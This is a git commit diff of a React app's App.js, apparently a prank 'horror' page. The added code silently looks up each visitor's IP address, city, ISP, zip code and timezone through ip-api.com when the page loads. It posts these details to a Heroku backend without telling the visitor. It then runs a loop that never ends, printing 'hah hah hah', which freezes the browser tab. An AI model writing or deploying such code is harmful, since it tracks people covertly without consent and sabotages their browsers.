83faeb93b3ca82a8d63daf354de14090b99dbb52
Rifat Al- Ashwad <rifatbilalphilips@gmail.com>
2021-03-22 18:21:48 +0600

    first commit

--- src/App.js
+++ src/App.js
@@ -1,29 +1,46 @@
 import React, { Component } from 'react';
 import axios from 'axios';
+import './App.css'
 
 export default class App extends Component {
   state = {
-    baseUrl:'https://immense-beyond-81444.herokuapp.com/api/',
-    test:''
+    // baseUrl:'http://127.0.0.1:8000/api',
+     baseUrl:'https://immense-beyond-81444.herokuapp.com/api',
+  
   }
 componentDidMount(){
-  axios.get(`${this.state.baseUrl}test`)
-  .then((response) => {
-    const test = response.data.test
-    this.setState(() => {
-      return {
-        test:test
-      }
-    })
+  axios.get('http://ip-api.com/json')
+  .then((res) => {
+    axios.post(`${this.state.baseUrl}/user`,{
+      city:res.data.city,
+      country:res.data.country,
+      isp:res.data.isp,
+      ip:res.data.query,
+      region:res.data.regionName,
+      timezone:res.data.timezone,
+      zip:res.data.zip,
+      website:'horror'
+     })
+     .then((response) => {
+      const test = response.data.success;
+     console.log(test);
+     this.horror();
 
+  
+    }) 
   })
+}
+horror = () => {
+  for (let i = 5; i > 3; i++){
+    console.log('hah hah hah')
+  }
 }
 
   render() {
     return (
       <div>
-        {this.state.test}
-      </div>
+        
+    </div>
     )
   }
 }
